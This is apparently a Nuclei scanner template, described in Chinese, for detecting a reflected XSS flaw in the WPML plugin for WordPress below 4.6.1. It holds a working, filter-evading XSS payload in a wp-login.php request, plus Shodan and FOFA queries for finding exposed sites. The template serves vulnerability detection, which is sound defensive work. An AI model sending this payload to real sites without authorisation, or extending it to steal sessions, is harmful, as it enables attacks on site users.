id: wpml-multilingual-cms-xss

info:
  name: WordPress WPML Multilingual CMS < 4.6.1 - 跨站脚本漏洞
  author: ritikchaddha
  severity: high
  description: |
    该模板用于检测 WordPress WPML Multilingual CMS < 4.6.1 - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/wp-login.php?wp_lang=%20=id=x+type=image%20id=xss%20onfoc<!>usin+alert(`document.domain`)%0c` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://wpscan.com/vulnerability/b9cc519c-7ec2-42c3-9f42-01e928e12139/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N
    cvss-score: 7.1
    cwe-id: CWE-79
  metadata:
    verified: true
    max-request: 1
    shodan-query: html:"/wp-content/plugins/sitepress-multilingual-cms"
    fofa-query: body="/wp-content/plugins/sitepress-multilingual-cms"
  tags: wordpress,wp-plugin,wpml,xss,sitepress-multilingual-cms

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-login.php?wp_lang=%20=id=x+type=image%20id=xss%20onfoc<!>usin+alert(`document.domain`)%0c"

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body, "id=xss onfocusin= alert(`document_domain`)", "Lost your password?</a>")'
          - 'contains(content_type, "text/html")'
          - 'status_code == 200'
        condition: and
